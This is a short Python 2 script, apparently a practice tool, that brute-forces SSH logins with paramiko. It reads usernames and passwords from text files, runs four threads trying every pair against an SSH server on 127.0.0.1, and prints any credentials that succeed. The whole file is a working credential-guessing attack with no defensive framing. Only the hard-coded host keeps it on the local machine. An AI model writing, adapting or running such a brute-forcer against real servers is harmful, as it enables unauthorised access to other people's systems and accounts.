#!/usr/bin/env python

import paramiko
from Queue import Queue
import threading

def attack(q):
    p = open('pass.txt','rt')
    user = q.get()
    for passw in p.readlines():
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        paramiko.util.log_to_file("ssh_brute.log")
        print "{} {} trying".format(user,passw.strip())
        try:
            ssh.connect('127.0.0.1',port=22,look_for_keys=False,timeout=None,username=user,password=passw.strip())
            ssh.close()
            print "="*25
            print "UwU creds are {} {}".format(user,passw.strip())
            print "="*25
        except:
            ssh.close()
            pass
    q.task_done()


u = open('user.txt','rt')
p = open('pass.txt','rt')

q = Queue()

for i in u.readlines():
    q.put(i.strip())

for i in range(4):
    worker = threading.Thread(target=attack, args=(q,)) 
    worker.setDaemon(True)
    worker.start()
        

q.join()
